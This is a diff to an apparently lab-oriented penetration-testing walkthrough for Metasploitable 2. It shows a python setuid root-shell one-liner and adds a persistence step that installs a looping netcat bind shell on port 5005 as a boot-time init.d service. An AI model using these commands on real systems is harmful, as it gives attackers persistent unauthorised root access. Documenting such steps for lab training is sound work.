@@ -663,8 +663,6 @@ Execute the following commands in the newly opened shell session:
        $ python -c 'import os;os.setuid(0);os.system("/bin/bash -p")'
        ```
    
-   #### A. Command Breakdown
-   
    | Command Part | Function | Significance |
    | :--- | :--- | :--- |
    | `python -c` | Execute code | Executes the following commands directly via the Python interpreter. |
@@ -677,6 +675,62 @@ Execute the following commands in the newly opened shell session:
    
    You now have a stable, full-featured Bash shell running with the highest possible privilege level (`root`). You can proceed with any post-exploitation activities.
 
+
+### 🔓 Step 5: Maintaining Access (Persistence Mechanism)
+
+In this step we will establish a persistent connection method on the victim machine. This ensures the ability to reconnect to the host even after the system reboots, which is critical for continued learning and analysis in a controlled lab environment.
+
+1. We will create a script that forces Netcat to listen continuously on a specified port, effectively creating a backdoor that runs as a system service.
+
+   Create the script file (listener.sh) in the system initialization directory (/etc/init.d/).
+
+   Use the opened root shell to write the contents to the file:
+
+   ```bash
+       $ echo "#!/bin/bash" > /etc/init.d/listener.sh
+       $ echo "(while true; do nc -l -v -p 5005 -e /bin/bash; done) &" >> /etc/init.d/listener.sh
+   ```
+   
+   
+    > **Note:** Netcat does not create persistent connections by default. The while true; do ... done loop ensures the listener restarts immediately if the connection is                        closed, and the & runs the process in the background. It listens on port 5005 and executes a Bash shell (-e /bin/bash) upon connection.
+   
+2. The system requires the script to have execute permissions to be recognized and run as a service.
+
+   Set the execute permission on the script file:
+   
+    ```bash
+       $ chmod +x /etc/init.d/listener.sh
+    ```
+   
+   
+3. Confirm that the script was created correctly with the required permissions.
+
+Display the attributes and content of the script file:
+
+```bash
+       $ ls -al /etc/init.d/listener.sh
+       $ cat /etc/init.d/listener.sh
+```
+
+![Excuuting Hydra Command](/images/python.png)
+
+4. The update-rc.d utility is used to integrate the script into the system's startup sequence (SysVinit on Metasploitable 2), making it execute during every boot.
+
+Configure listener.sh to run at the default system startup runlevels:
+
+```bash
+       $ sudo update-rc.d listener.sh defaults
+```
+![Excuuting Hydra Command](/images/persistent_bd.png)
+
+5. To confirm that the script has been successfully registered, we check the runlevel directory, which contains symbolic links to all services that start at a given runlevel.
+
+List the services configured to start at boot (Runlevel 3):
+
+```bash
+       $ ls -x /etc/rc3.d
+```
+![Excuuting Hydra Command](/images/startup.png)
 
 
 
